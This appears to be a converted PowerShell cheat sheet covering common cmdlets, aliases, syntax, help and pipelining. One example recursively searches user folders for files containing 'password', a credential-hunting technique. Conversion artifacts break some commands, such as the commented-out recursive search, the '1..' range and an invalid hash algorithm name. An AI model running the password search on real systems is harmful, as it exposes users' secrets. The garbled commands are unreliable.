Purpose
```
```
The purpose of this cheat sheet is to
describe some common options and
techniques for use in Microsoft’s
PowerShell.
```
```
PowerShell Overview
PowerShell Background
```
```
PowerShell is the successor to command.com,
cmd.exe and cscript. Initially released as a
separate download, it is now built in to all modern
versions of Microsoft Windows. PowerShell
syntax takes the form of verb-noun patterns
implemented in cmdlets.
```
```
Launching PowerShell
```
```
PowerShell is accessed by pressing Start ->
typing powershell and pressing enter.
Some operations require administrative privileges
and can be accomplished by launching
PowerShell as an elevated session. You can
launch an elevated PowerShell by pressing Start -
> typing powershell and pressing Shift-CTRL-
Enter.
Additionally, PowerShell cmdlets can be called
from cmd.exe by typing: powershell -c
"<command>".
```
```
Useful Cmdlets (and aliases)
```
Get a directory listing (ls, dir, gci):
PS C:\> Get-ChildItem

Copy a file (cp, copy, cpi):
PS C:\> Copy-Item src.txt dst.txt

Move a file (mv, move, mi):
PS C:\> Move-Item src.txt dst.txt

Find text within a file:
PS C:\> Select-String –path c:\users
\*.txt –pattern password
PS C:\> ls -r c:\users -file | %
{/* {Select-String -path $_ -pattern
password} */}

Display file contents (cat, type, gc):
PS C:\> Get-Content file.txt

Get present directory (pwd, gl):
PS C:\> Get-Location

Get a process listing (ps, gps):
PS C:\> Get-Process

Get a service listing:
PS C:\> Get-Service

Formatting output of a command (Format-List):
PS C:\> ls | Format-List –property
name

Paginating output:
PS C:\> ls –r | Out-Host -paging

Get the SHA1 hash of a file:
PS C:\> Get-FileHash -Algorithm SHA
file.txt

Exporting output to CSV:
PS C:\> Get-Process | Export-Csv
procs.csv


```
Syntax
```
Cmdlets are small scripts that follow a dash-
separated verb-noun convention such as "Get-
Process".

**Similar Verbs with Different Actions:**

- New- Creates a new resource
- Set- Modifies an existing resource
- Get- Retrieves an existing resource
- Read- Gets information from a source, such
    as a file
- Find- Used to look for an object
- Search- Used to create a reference to a
    resource
- Start- (asynchronous) begin an operation,
    such as starting a process
- Invoke- (synchronous) perform an operation
    such as running a command

**Parameters:**
Each verb-noun named cmdlet may have many
parameters to control cmdlet functionality.

**Objects:**
The output of most cmdlets are objects that can
be passed to other cmdlets and further acted
upon. This becomes important in pipelining
cmdlets.

```
Finding Cmdlets
```
To get a list of all available cmdlets:
PS C:\> Get-Command

Get-Command supports filtering. To filter cmdlets
on the verb set:
PS C:\> Get-Command Set* or
PS C:\> Get-Command –Verb Set

Or on the noun process:
PS C:\> Get-Command *Process or
PS C:\> Get-Command –Noun process

```
Getting Help
```
```
To g e t h e l p w i t h h e l p :
PS C:\> Get-Help
```
```
To read cmdlet self documentation:
PS C:\> Get-Help <cmdlet>
```
```
Detailed help:
PS C:\> Get-Help <cmdlet> -detailed
```
```
Usage examples:
PS C:\> Get-Help <cmdlet> -examples
```
```
Full (everything) help:
PS C:\> Get-Help <cmdlet> -full
```
```
Online help (if available):
PS C:\> Get-Help <cmdlet> -online
```
```
Cmdlet Aliases
```
```
Aliases provide short references to long
commands.
```
```
To list available aliases (alias alias):
PS C:\> Get-Alias
```
```
To expand an alias into a full name:
PS C:\> alias <unknown alias>
PS C:\> alias gcm
```
```
Efficient PowerShell
```
```
Tab completion:
PS C:\> get-child<TAB>
PS C:\> Get-ChildItem
```
```
Parameter shortening:
PS C:\> ls –recurse is equivalent to:
PS C:\> ls -r
```
```

Pipelining, Loops, and Variables
```
```
Piping cmdlet output to another cmdlet:
PS C:\> Get-Process | Format-List
–property name
```
```
ForEach-Object in the pipeline (alias %):
PS C:\> ls *.txt | ForEach-Object
{cat $_}
```
```
Where-Object condition (alias where or ?):
PS C:\> Get-Process | Where-Object
{$_.name –eq "notepad"}
```
```
Generating ranges of numbers and looping:
PS C:\> 1..
PS C:\> 1..10 | % {echo "Hello!"}
```
```
Creating and listing variables:
PS C:\> $tmol = 42
PS C:\> ls variable:
```
```
Examples of passing cmdlet output down pipeline:
PS C:\> dir | group extension | sort
PS C:\> Get-Service dhcp | Stop-
Service -PassThru | Set-Service -
StartupType Disabled
